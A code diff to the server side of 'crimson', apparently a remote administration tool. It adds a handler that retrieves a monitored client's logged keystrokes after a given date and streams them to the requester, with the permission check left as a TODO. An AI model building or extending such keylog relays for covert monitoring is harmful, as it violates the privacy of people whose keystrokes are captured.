@@ -18,6 +18,7 @@
 package com.subterranean_security.crimson.server.net;
 
 import java.io.IOException;
+import java.util.Date;
 import java.util.concurrent.TimeUnit;
 
 import org.slf4j.Logger;
@@ -40,6 +41,9 @@ import com.subterranean_security.crimson.core.proto.FileManager.RS_FileHandle;
 import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Generator.RS_Generate;
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
+import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
+import com.subterranean_security.crimson.core.proto.Keylogger.RS_KeyUpdate;
 import com.subterranean_security.crimson.core.proto.Listener.RS_AddListener;
 import com.subterranean_security.crimson.core.proto.Login.RQ_LoginChallenge;
 import com.subterranean_security.crimson.core.proto.Login.RS_Login;
@@ -50,6 +54,7 @@ import com.subterranean_security.crimson.core.proto.Users.RQ_AddUser;
 import com.subterranean_security.crimson.core.proto.Users.RS_AddUser;
 import com.subterranean_security.crimson.core.proto.Users.RS_EditUser;
 import com.subterranean_security.crimson.core.stream.StreamStore;
+import com.subterranean_security.crimson.core.stream.subscriber.SubscriberSlave;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.Crypto;
 import com.subterranean_security.crimson.core.util.IDGen;
@@ -149,6 +154,8 @@ public class ServerExecutor extends BasicExecutor {
 						rq_file_handle(m);
 					} else if (m.hasRsFileHandle()) {
 						rs_file_handle(m);
+					} else if (m.hasRqKeyUpdate()) {
+						rq_key_update(m);
 					} else {
 						receptor.cq.put(m.getId(), m);
 					}
@@ -159,6 +166,26 @@ public class ServerExecutor extends BasicExecutor {
 
 		});
 		nbt.start();
+	}
+
+	private void rq_key_update(Message m) {
+		// TODO check permissions
+
+		RQ_KeyUpdate rq = m.getRqKeyUpdate();
+		Date target = new Date(rq.getStartDate());
+
+		ClientProfile cp = ServerStore.Profiles.getClient(rq.getCid());
+		if (cp != null) {
+			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
+				receptor.handle.write(Message.newBuilder().setUrgent(true).setSid(rq.getCid()).setEvKevent(k).build());
+			}
+			receptor.handle.write(Message.newBuilder().setId(m.getId())
+					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
+		} else {
+			receptor.handle.write(Message.newBuilder().setId(m.getId())
+					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
+		}
+
 	}
 
 	private void ev_kevent(Message m) {
@@ -500,6 +527,9 @@ public class ServerExecutor extends BasicExecutor {
 		Param p = m.getMiStreamStart().getParam();
 		if (p.hasInfoParam()) {
 			StreamStore.addStream(new SInfoSlave(p));
+		}
+		if (p.hasSubscriberParam()) {
+			StreamStore.addStream(new SubscriberSlave(p));
 		}
 
 	}
